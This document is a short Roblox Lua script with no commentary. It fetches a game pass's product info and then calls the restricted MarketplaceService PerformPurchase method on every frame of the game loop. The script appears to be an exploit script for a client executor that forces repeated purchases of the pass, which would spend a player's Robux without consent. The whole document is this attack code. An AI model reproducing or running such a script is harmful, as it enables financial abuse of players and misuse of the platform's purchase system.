gamePassId = 7192821
market = game:GetService("MarketplaceService")
http = game:GetService("HttpService")
info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
game:GetService("RunService").Stepped:connect(function()
market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
end)
